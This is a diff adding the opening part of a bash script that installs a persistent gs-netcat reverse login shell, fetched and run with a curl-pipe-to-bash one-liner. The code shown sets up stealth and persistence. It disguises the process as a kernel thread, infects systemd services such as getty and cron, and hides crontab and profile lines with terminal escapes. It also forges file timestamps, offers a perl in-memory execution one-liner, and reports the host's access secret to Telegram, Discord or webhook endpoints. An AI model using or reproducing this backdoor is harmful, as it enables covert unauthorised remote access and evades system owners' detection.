@@ -1,0 +1,2356 @@
+#! /usr/bin/env bash
+
+# Install and start a permanent gs-netcat reverse login shell
+#
+# See https://www.gsocket.io/deploy/ for examples.
+#
+# This script is typically invoked like this as root or non-root user:
+#   $ bash -c "$(curl -fsSL https://gsocket.io/y)"
+#
+# Connect
+#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
+# Pre-set a secret:
+#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
+# Uninstall
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/y)"
+#
+# Other variables:
+# GS_DEBUG=1
+#		- Verbose output
+#		- Shorter timeout to restart crontab etc
+#       - Often used like this:
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
+# GS_USELOCAL=1
+#       - Use local binaries (do not download)
+# GS_USELOCAL_GSNC=<path to gs-netcat binary>
+#       - Use local gs-netcat from source tree
+# GS_NOSTART=1
+#       - Do not start gs-netcat (for testing purpose only)
+# GS_NOINST=1
+#		- Do not install gsocket
+# GS_NOTEST=1
+#       - Do not test Global Socket Relay Network
+# GS_OSARCH=x86_64-linux or mipsel32-linux etc
+#       - Force architecture to a specific package (for testing purpose only)
+# GS_PREFIX=
+#		- Use 'path' instead of '/' (needed for packaging/testing)
+# GS_URL_BASE=https://gsocket.io
+#		- Specify URL of static binaries
+# GS_URL_BIN=
+#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
+# GS_DSTDIR="/tmp/foobar/blah"
+#		- Specify custom installation directory
+# GS_BEACON=30
+#       - Only connect back every 30 minutes and check for a client.
+# GS_NOINFECT=1
+#       - Try NO to infect a systemd service before any other persistency
+# GS_NOFFPID=1
+#       - Do not fast forward to a small pid.
+# GS_NOREEXEC=1
+#       - Do not re-exec or change argv0.
+# GS_NOCRONTAB=1
+#       - Disable crontab persistency (do not install in crontab).
+# GS_NOLINEHIDING=1
+#       - Do not try to hide the crontab/profile lines with terminal escapes.
+# GS_NONOTE=1
+#       - Do not include "Dont remove this line" warning in crontab/profile [default=1].
+# GS_NOENC=1
+#       - Do not base64/xxd encode profile/crontab strings.
+# GS_NOMEMEXEC=1
+#       - When S= is used, do not use memexec but download to file system instead.
+# GS_NAME="[kcached]"
+#       - Specify custom hidden name file & process. Default is picked at random.
+# GS_BIN="fg"
+#       - Specify custom name for binary on filesystem
+#       - Set to GS_NAME if GS_NAME is specified.
+# GS_SERVICE="supervise"
+#       - Name for systemd's supervise.service
+#       - Set to GS_BIN by default
+# GS_DL=wget
+#       - Command to use for download. =wget or =curl.
+# GS_TG_TOKEN=
+#       - Telegram Bot ID, =5794110125:AAFDNb...
+# GS_TG_CHATID=
+#       - Telegram Chat ID, =-8834838...
+# GS_DISCORD_KEY=
+#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+# GS_WEBHOOK_KEY=
+#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+# GS_WEBHOOK=
+#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
+# GS_DNSHOOK=<domain name>
+#       - Request <SECRET>.<domain-name>. See https://app.interactsh.com
+# GS_HOST=
+#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
+#       - See https://github.com/hackerschoice/gsocket-relay
+# GS_PORT=
+#       - Port for the GSRN-Server. Default is 443.
+# GS_DOMAIN=
+#       - use [a-z].gz.<GS_DOMAIN> to resolve relay addresses.
+# GS_WORKDIR=
+#       - Set the HOME directory (e.g. try GS_WORKDIR=/dev/shm).
+
+# Global Defines
+###----BEGIN changed by CICD script-----
+CICD_GS_BRANCH="beta"
+###-----END-----
+[[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
+[[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
+unset CICD_GS_BRANCH
+SCRIPT_DEPLOY_NAME="y"
+
+# URL_BASE_CDN="https://cdn.gsocket.io"
+# URL_BASE_X="https://gsocket.io"
+
+# DEFAULT: Pure GitHub:
+# GitHub action changes this to https://gsocket.io for www deployment.
+URL_BASE_CDN="https://gsocket.io"
+URL_BASE_X="https://gsocket.io"
+
+# -----BEGIN deploy_server.sh HOOK-----
+# These stubs are filled out by deploy_server.sh:
+IS_DEPLOY_SERVER=
+URL_BASE=
+DS_GS_HOST=
+DS_GS_PORT=
+DS_GS_BEACON=
+DS_GS_NAME=
+DS_GS_BIN=
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+# -----END deploy_server.sh HOOK-----
+[[ -n $URL_BASE ]] && [[ -z $GS_URL_BASE ]] && GS_URL_BASE="$URL_BASE"
+[[ -n $IS_DEPLOY_SERVER ]] && unset GS_BRANCH
+[ -z "$GS_HOST" ] && GS_HOST="$DS_GS_HOST"
+[ -z "$GS_PORT" ] && GS_PORT="$DS_GS_PORT"
+[ -z "$GS_BEACON" ] && GS_BEACON="$DS_GS_BEACON"
+[ -z "$GS_NAME" ] && GS_NAME="$DS_GS_NAME"
+[ -z "$GS_BIN" ] && GS_BIN="$DS_GS_BIN"
+[ -n "$gs_deploy_webhook" ] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook DS_GS_HOST DS_GS_PORT DS_GS_BEACON DS_GS_NAME DS_GS_BIN
+
+[ -z "$GS_NOLINEHIDING" ] && _ESC_CLEARLN=$'\e'"[2K"$'\e'"[1A"
+
+ORIG_ARGS=("$@")
+[[ -n $GS_URL_BASE ]] && {
+	URL_BASE_CDN="${GS_URL_BASE}"
+	URL_BASE_X="${GS_URL_BASE}"
+}
+[[ -n $GS_BRANCH ]] && {
+	URL_BASE_CDN+="/${GS_BRANCH}"
+	URL_BASE_X+="/${GS_BRANCH}"
+}
+URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+[[ -n $GS_URL_BIN ]] && {
+	URL_BIN="${GS_URL_BIN}"
+	URL_BIN_FULL="$URL_BIN"
+}
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/${SCRIPT_DEPLOY_NAME}"
+
+# WEBHOOKS are executed after a successful install
+# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+### Telegram
+# GS_TG_TOKEN="5794110125:AAFDNb..."
+# GS_TG_CHATID="-8834838..."
+[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+}
+### Generic URL as webhook (any URL)
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+}
+### webhook.site
+# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+### discord webhook
+# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
+unset data
+unset msg
+
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+
+bin_hidden_name_arr=("supervise" "restart" "usbmon" "fg" "bg")
+BIN_HIDDEN_NAME_DEFAULT="${bin_hidden_name_arr[$((RANDOM % ${#bin_hidden_name_arr[@]}))]}"
+
+service_hidden_name_arr=("supervise" "init" "restart" "monitor" "update")
+SERVICE_HIDDEN_NAME_DEFAULT="${service_hidden_name_arr[$((RANDOM % ${#service_hidden_name_arr[@]}))]}"
+
+# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+proc_name_arr=("sshd:" "[kthreadd]" "[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+# for str in "${proc_name_arr[@]}"; do
+# 	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9_-]/\\&/g')"
+# done
+# PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
+
+# ~/.config/<NAME>
+config_dir_name_arr=("mc" "procps" "pulse" "Thunar" "powershell" "dconf")
+CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_arr[@]}))]}"
+
+### DEFAULTS:
+# GS_INFECT=1
+# GS_NOTE=1
+GS_FFPID=1
+GS_REEXEC=1
+GS_SYSTEMD_PERSIST="oneshot"
+GS_MEMEXEC=1
+#GS_SYSTEMD_PERSIST="default"
+
+[ -n "$GS_NOINFECT" ] && unset GS_INFECT
+[ -n "$GS_NONOTE" ] && unset GS_NOTE
+[ -n "$GS_NOFFPID" ] && unset GS_FFPID
+[ -n "$GS_NOREEXEC" ] && unset GS_REEXEC
+[ -n "$GS_NOMEMEXEC" ] && unset GS_MEMEXEC
+unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
+
+# systemd candidates for binary infection
+# res=$(command -v dbus-daemon) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("dbus")
+# }
+# res=$(command -v /lib/systemd/systemd-journald) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-journald")
+# }
+# res=$(command -v /lib/systemd/systemd-udevd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-udevd")
+# }
+# res=$(command -v rsyslogd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("rsyslog")
+# }
+# => Got notification message from PID 52031, but reception only permitted for main PID 52029
+res=$(command -v agetty) && {
+	INFECT_BIN_NAME_ARR+=("${res:?}")
+	if systemctl is-active --quiet 'getty@tty1' &>/dev/null; then
+		INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
+		systemctl show 'getty@tty1' --property=ExecStart | grep -qm1 -F "noclear" && INFECT_SYSTEMD_ARGV_MATCH="noclear"
+	elif systemctl is-active --quiet 'serial-getty@ttyS0' &>/dev/null; then
+		INFECT_SYSCTL_NAME_ARR+=("serial-getty@ttyS0")
+		INFECT_SYSTEMD_ARGV_MATCH="ttyS0"
+	fi
+}
+res=$(command -v cron) && {
+	INFECT_BIN_NAME_ARR+=("${res:?}")
+	INFECT_SYSCTL_NAME_ARR+=("cron")
+}
+
+# Names for 'uninstall' (including names from previous versions)
+BIN_HIDDEN_NAME_RM=("${bin_hidden_name_arr[@]}" "core" "defunct" "gs-dbus" "gs-db")
+CONFIG_DIR_NAME_RM=("${config_dir_name_arr[@]}" "htop" "dbus")
+
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CB="\033[1;34m" # blue
+	CM="\033[1;35m" # magenta
+	CC="\033[1;36m" # cyan
+	CDR="\033[0;31m" # red
+	CDB="\033[0;34m" # blue
+	CDG="\033[0;32m" # green
+	CDY="\033[0;33m" # yellow
+	CDC="\033[0;36m" # cyan
+	CF="\033[2m"    # faint
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+	CRY="\e[0;33;41m"  # YELLOW on RED (warning)
+}
+
+if [[ -z "$GS_DEBUG" ]]; then
+	DEBUGF(){ :;}
+else
+	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
+fi
+
+_ts_fix()
+{
+	local fn
+	local ts
+	local args
+	local ax
+	fn="$1"
+	ts="$2"
+
+	args=() #OSX, must init or " " in touch " " -r 
+
+	[[ ! -e "$1" ]] && return
+	[[ -z $ts ]] && return
+
+	# Change the symlink for ts_systemd_fn items
+	[[ -n "$3" ]] && args=("-h")
+
+	# Either reference by Timestamp or File
+	[[ "${ts:0:1}" = '/' ]] && {
+		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
+		ax=("${args[@]}" "-r" "$ts" "$fn")
+		touch "${ax[@]}" 2>/dev/null
+		return
+	}
+	ax=("${args[@]}" "-t" "$ts" "$fn")
+	touch "${ax[@]}" 2>/dev/null && return
+	# If 'date -r' or 'touch -t' failed:
+	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
+	touch "${ax[@]}" 2>/dev/null
+}
+
+# Restore timestamp of files
+ts_restore()
+{
+	local fn
+	local n
+	local ts
+
+	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		ts="${_ts_ts_a[$n]}"
+		fn="${_ts_fn_a[$n]}"
+		# DEBUGF "RESTORE-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts"
+	done
+	unset _ts_fn_a
+	unset _ts_ts_a
+
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
+		ts="${_ts_systemd_ts_a[$n]}"
+		fn="${_ts_systemd_fn_a[$n]}"
+		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
+		((n++))
+
+		_ts_fix "$fn" "$ts" "symlink"
+	done
+	unset _ts_systemd_fn_a
+	unset _ts_systemd_ts_a
+}
+
+ts_is_marked()
+{
+	local fn
+	local a
+	fn="$1"
+
+	for a in "${_ts_fn_a[@]}"; do
+		[[ "$a" = "$fn" ]] && return 0 # True
+	done
+
+	return 1 # False
+}
+
+# There are some files which need TimeStamp update after all other TimeStamps
+# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
+# ts_add_last [file] <reference file>
+ts_add_systemd()
+{
+	local fn
+	local ts
+	local ref
+	fn="$1"
+	ref="$2"
+
+	ts="$ref"
+	[[ -z $ref ]] && {
+		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
+	}
+
+	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
+	_ts_systemd_ts_a+=("$ts")
+	_ts_systemd_fn_a+=("$fn")
+}
+
+# Determine the Timestamp of the file $fn that is about to be
+# created (or already exists).
+# Sets $_ts_ts to Timestamp.
+# Usage: _ts_get_ts [$fn]
+_ts_get_ts()
+{
+	local fn
+	local n
+	local pdir
+	local oldest
+	fn="$1"
+	pdir="$(dirname "$1")"
+
+	unset _ts_ts
+	unset _ts_pdir_by_us
+	# Inherit Timestamp if parent directory was created
+	# by us.
+	n=0
+	while :; do
+		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
+		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
+			_ts_ts="${_ts_ts_a[$n]}"
+			_ts_pdir_by_us=1
+			# DEBUGF "Parent ${pdir} created by us."
+			return
+		}
+		((n++))
+	done
+
+	# Check if file exists.
+	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
+
+	# Take ts from oldest file in directory
+	# shellcheck disable=SC2012 #Use find instead of ls => not portable
+	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
+	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
+}
+
+
+_ts_add()
+{
+	# Retrieve TimeStamp for $1
+	_ts_get_ts "$1"
+	# Add TimeStamp
+	_ts_ts_a+=("$_ts_ts")
+	_ts_fn_a+=("$1");
+	_ts_mkdir_fn_a+=("$2")
+}
+
+# Return 0 if not yet marked. Error if already marked.
+_ts_add_pdir() {
+	local pdir
+
+	pdir="$(dirname "${1:?}")"
+	ts_is_marked "$pdir" && return 200
+
+	_ts_add "$pdir" "<NOT BY ADD_PDIR>"
+}
+
+# Note: Do not use global _ts variables except _ts_ts
+# Usage: mk_file [filename]
+mk_file()
+{
+	local fn
+	local pdir_added
+	fn="$1"
+	local exists
+
+	# DEBUGF "${CC}MK_FILE($fn)${CN}"
+	_ts_add_pdir "$fn" && pdir_added=1
+
+	[[ -e "$fn" ]] && exists=1
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked
+		_ts_get_ts "$fn"
+		# Do not add if creation fails.
+		touch "$fn" 2>/dev/null || {
+			# HERE: Permission denied
+			[[ -n "$pdir_added" ]] && {
+				# Remove pdir if it was added above
+				# Bash <5.0 does not support arr[-1]
+				# Quote (") to silence shellcheck
+				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
+				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
+				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
+			}
+			return 69 # False
+		}
+		[[ -z $exists ]] && chmod 600 "$fn"
+		_ts_ts_a+=("$_ts_ts")
+		_ts_fn_a+=("$fn");
+		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
+		return
+	}
+
+	touch "$fn" 2>/dev/null || return
+	[[ -z $exists ]] && chmod 600 "$fn"
+	true
+}
+
+xrmdir()
+{
+	local fn
+	local pdir
+	fn="$1"
+
+	[[ ! -d "$fn" ]] && return
+	_ts_add_pdir "$fn"
+
+	rmdir "${fn:?}" 2>/dev/null
+}
+
+xrm() {
+	local pdir
+	local fn
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return
+	_ts_add_pdir "$fn"
+
+	rm -f "${fn:?}" 2>/dev/null
+}
+
+# Create a directory if it does not exist and fix timestamp
+# xmkdir [directory] <ts reference file>
+xmkdir() {
+	local fn
+	local pdir
+	fn="$1"
+
+	DEBUGF "${CG}XMKDIR($fn)${CN}"
+	pdir="$(dirname "$fn")"
+	true # reset $?
+	[[ -d "$fn" ]] && return     # Directory already exists
+	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)
+
+	# Check if parent is being tracked
+	ts_is_marked "$pdir" || {
+		# HERE: Parent not tracked
+		# We did not create the parent or we would be tracking it.
+		_ts_add "$pdir" "<NOT BY XMKDIR>"
+	}
+
+	# Check if new directory is already tracked
+	ts_is_marked "$fn" || {
+		# HERE: Not yet tracked (normal case)
+		_ts_add "$fn" "$fn" # We create the directory (below)
+	}
+
+	mkdir "$fn" 2>/dev/null || return
+	chmod 700 "$fn"
+	true
+}
+
+xcp() {
+	local src="$1"
+	local dst="$2"
+
+	{ [ -z "$2" ] || [ "$2" == "-" ]; } && { cat "$src"; return; }
+	# DEBUGF "${CG}XCP($src, $dst)${CN}"
+	# Must create file first so that SELinux does not inherit the user_tmp_t flag
+	mk_file "$dst" || return
+	cp "$src" "$dst" || return
+	return 0
+}
+
+xmv() {
+	local src="$1"
+	local dst="$2"
+
+	_ts_add_pdir "$dst"
+	_ts_add_pdir "$src"
+	[[ -e "$dst" ]] && rm -f "$dst"
+
+	mv "$src" "$dst"
+	return 0
+}
+
+
+exit_code() {
+	ts_restore
+
+	exit "$1"
+}
+
+errexit() {
+	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
+
+	exit_code 255
+}
+
+try_execbin() {
+	local fn="${1:?}"
+	local is_try_ldso="${2}"
+
+	# ~/.config/* bins can be set as 600 permission and started with /lib/ld.so
+	[[ -n "$is_try_ldso" ]] && [[ -n "$LDSO" ]] && {
+		chmod 600 "$fn"
+		"$LDSO" "${fn}" -g &>/dev/null && return 0
+	}
+
+	chmod 700 "$fn"
+	# Between 28th April and end of May 2020 we accidentially
+	# over wrote /bin/true with gs-bd binary. Thus we use -g
+	# to make true, id and gs-bd return true (in case it's gs-bs).
+	"${fn}" -g &>/dev/null || return 255
+	# LDSO failed but normal execution worked. Discard LDSO method.
+	unset LDSO
+
+	return 0
+}
+
+# Test if directory can be used to store executeable
+# try_dstdir "/tmp/.gs-foobar"
+# Return 0 on success.
+try_dstdir()
+{
+	local dstdir="${1:?}"
+	local trybin
+	local is_try_ldso="${2}"
+	local is_need_rmdir
+
+	# Create directory if it does not exists.
+	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; _IS_DSTDIR_CREATED=1; is_need_rmdir=1; }
+
+	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
+ 
+	mk_file "$DSTBIN" || { [ -n "$is_need_rmdir" ] && xrmdir "$dstdir"; return 102; }
+
+	# Find an executeable and test if we can execute binaries from
+	# destination directory (no noexec flag)
+	# /bin/true might be a symlink to /usr/bin/true
+	for ebin in "/bin/true" "/usr/bin/true" "$(command -v id)"; do
+		[[ -z $ebin ]] && continue
+		[[ -e "$ebin" ]] && break
+	done
+	[[ ! -e "$ebin" ]] && return 0 # True. Try our best
+
+	# Must use same name on busybox-systems
+	trybin="${dstdir}/$(basename "$ebin")"
+
+	# /bin/true might be a symlink to /usr/bin/true
+	[[ "$ebin" -ef "$trybin" ]] && return 0
+	mk_file "$trybin" || { [ -n "$is_need_rmdir" ] && xrmdir "$dstdir"; return 103; }
+
+	cp "$ebin" "$trybin" &>/dev/null && {
+		try_execbin "${trybin:?}" "${is_try_ldso}" && {
+			rm -f "${trybin:?}"
+			return 0
+		}
+	}
+	[ -n "$is_need_rmdir" ] && xrmdir "$dstdir"
+	return 255
+}
+
+output_memexec() {
+	[[ "$OSNAME" != "linux" ]] && return
+	echo -e "Alternativly, cut & paste the following to deploy to memory:"
+	[[ -z "$X" ]] && {
+		echo -e "${CDC}X=${CDY}SecretChangeMe${CDR} ${CRY}# <--- CHANGE THIS!${CN}"
+	}
+	echo -e "${CM}${DL[*]} ${URL_BIN}/${SRC_PKG} | \\"
+	echo "GS_ARGS=\"-ilD -s \${X:?}\" \\"
+	echo -n 'perl '"'"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'"'"' --'
+	echo -e "${CN}"
+}
+
+init_dstbin_exit() {
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
+	[ -z "$S" ] && output_memexec
+	errexit
+}
+
+# Called _after_ init_vars() at the end of init_setup.
+init_dstbin()
+{
+	if [[ -n "$GS_DSTDIR" ]]; then
+		try_dstdir "${GS_DSTDIR}" "" && return
+		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
+	fi
+
+	[ -n "$S" ] && {
+		try_dstdir "/dev/shm/.gsusr-${UID}" "1" && return
+		try_dstdir "/var/tmp/.gsusr-${UID}" "1" && return
+		try_dstdir "/tmp/.gsusr-${UID}" "1" && return
+		try_dstdir "${PWD}" "1" && return
+
+		init_dstbin_exit
+	}
+	# Try systemwide installation first. Do not use LDSO-method for installs to /usr/sbin
+	try_dstdir "${GS_PREFIX}/usr/sbin" "" && return
+
+	# Try user installation
+	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
+	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" "1" && return
+
+	# Try current working directory
+	try_dstdir "${PWD}" "1" && { IS_DSTBIN_CWD=1; return; }
+
+	# Try /var/tmp/.gsusr-*
+	try_dstdir "/var/tmp/.gsusr-${UID}" "1" && { IS_DSTBIN_TMP=1; return; }
+
+	# Try /tmp/.gsusr-*
+	try_dstdir "/tmp/.gsusr-${UID}" "1" && { IS_DSTBIN_TMP=1; return; }
+
+	# Try /dev/shm as last resort
+	try_dstdir "/dev/shm" "1" && { IS_DSTBIN_TMP=1; return; }
+
+	init_dstbin_exit
+}
+
+try_encode()
+{
+	local enc
+	local dec
+	local teststr
+	prg="$1"
+	enc="$2"
+	dec="$3"
+
+	teststr="blha|;id-u \'this is a long test of a very long string to test encodign decoding process # foobar"
+
+	[[ -n $ENCODE_STR ]] && return
+
+	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
+	ENCODE_STR="$enc"
+	DECODE_STR="$dec"
+}
+
+
+# Return TRUE if we are 100% sure it's little endian
+# Only used for MIPS & ARM where it should default to BIG endian (unless we are 100% sure it's LE).
+is_le()
+{
+	local str
+
+	command -v od >/dev/null && command -v awk >/dev/null  && {
+		str="$(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}')"
+		[[ "$str" == "1" ]] && return 0
+		[[ "$str" == "0" ]] && return 255
+	}
+
+	command -v python >/dev/null && {
+		str="$(python -c 'import sys; print(sys.byteorder)')"
+		[[ "$str" == "little" ]] && return 0
+		[[ "$str" == "big" ]] && return 255
+	}
+
+	command -v perl >/dev/null && {
+		str="$(perl -MConfig -e 'print "$Config{byteorder}\n";')"
+		[[ "$str" == "1"* ]] && return 0
+		[[ "$str" == "87654321" ]] && return 255
+		[[ "$str" == "4321" ]] && return 255
+	}
+
+	command -v printf >/dev/null && command -v hexdump >/dev/null && {
+		printf '\x01\x02' | hexdump -x | grep -q 0201 && return 0
+		printf '\x01\x02' | hexdump -x | grep -q 0102 && return 255
+	}
+
+	# command -v lscpu >/dev/null && {
+	# 	# lscpu LIES on qemu/s390x (should be BIG).
+	# 	[[ $(lscpu) == *"Little Endian"* ]] && return 0
+	# }
+
+	return 255
+}
+
+
+# Return 0 (TRUE) if it is 64 bit arch. Default is FALSE (32bit)
+is_64bit() {
+	command -v getconf >/dev/null && [[ "$(getconf LONG_BIT)" == "64" ]] && return 0
+	command -v lscpu >/dev/null && [[ "$(lscpu)" == *"64-bit"* ]] && return 0
+	command -v uname >/dev/null && [[ "$(uname -m)" == *"64"* ]] && return 0
+	return 255		
+}
+
+init_vars()
+{
+	local arch
+	local osname
+	local service
+	local bin
+	arch=$(uname -m)
+	local phome
+
+	# set PWD if not set
+	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
+
+	[[ "$GS_BEACON" -eq 0 ]] && unset GS_BEACON
+	[[ "$GS_BEACON" -gt 0 ]] && [[ "$GS_BEACON" -lt 10 ]] && GS_BEACON=10
+	[[ "$GS_DEBUG" -eq 0 ]] && unset GS_DEBUG
+
+	local osname
+	osname="$(uname -s)"
+	OSNAME="linux" # DEFAULT
+	if [[ "$osname" == *FreeBSD* ]]; then
+		OSNAME="freebsd"
+	elif [[ "$osname" == *Darwin* ]]; then
+		OSNAME="osx"
+	elif [[ "$osname" == *OpenBSD* ]]; then
+		OSNAME="openbsd"
+	fi
+
+	# Unset so that test_dstbin() can test -g parameter without exiting.
+	unset GSNC
+	unset OSARCH
+	unset SRC_PKG
+	# User supplied OSARCH
+	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
+
+	if [[ -z "$OSARCH" ]]; then
+		if [[ $OSNAME == "linux" ]]; then 
+			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
+				OSARCH="i386"
+			elif [[ "$arch" == "x86_64" ]]; then
+				OSARCH="x86_64"
+			elif [[ "$arch" == *"armv6"* ]]; then
+				OSARCH="arm6"
+			elif [[ "$arch" == *"armv7l" ]]; then
+				OSARCH="arm7"
+			elif [[ "$arch" == *"armv"* ]]; then
+				OSARCH="arm" # RPI-Zero / RPI 4b+
+			elif [[ "$arch" == "aarch64" ]]; then
+				OSARCH="aarch64"
+			elif [[ "$arch" == "x86_64" ]]; then
+				OSARCH="x86_64"
+			elif [[ "$arch" == "mips64" ]]; then
+				OSARCH="mips64"
+				is_le && OSARCH="mipsel32"
+			elif [[ "$arch" == *mips* ]]; then
+				OSARCH="mips32"
+				is_le && OSARCH="mipsel32"
+			elif [[ "$arch" == *"ppc"* ]]; then
+				if is_64bit; then
+					OSARCH="powerpc64"
+					is_le && OSARCH="powerpc64le"
+				else
+					OSARCH="powerpc"
+					is_le && OSARCH="powerpcle"
+				fi
+			fi
+			[[ -n "$OSARCH" ]] && OSARCH+="-linux"
